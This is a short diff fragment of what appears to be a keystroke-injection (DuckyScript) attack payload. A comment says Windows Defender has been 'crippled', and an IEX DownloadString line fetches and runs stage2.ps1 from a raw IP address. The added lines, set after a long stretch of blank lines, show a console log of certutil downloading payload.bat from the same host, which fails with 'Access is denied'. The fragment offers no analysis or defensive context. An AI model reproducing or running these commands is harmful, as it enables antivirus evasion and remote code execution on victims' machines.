@@ -172,3 +172,30 @@ PS C:\WINDOWS\system32>
 REM ── Step 14: Direct pull now that Defender is crippled ──
 STRINGLN IEX(New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
 DELAY 1000
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+C:\Windows\System32>mkdir C:\Windows\Temp\Cache
+A subdirectory or file C:\Windows\Temp\Cache already exists.
+
+C:\Windows\System32>certutil -urlcache -split -f http://153.75.82.198/payload.bat C:\Windows\Temp\Cache\p.bat
+Access is denied.
+
+C:\Windows\System32>
+
+
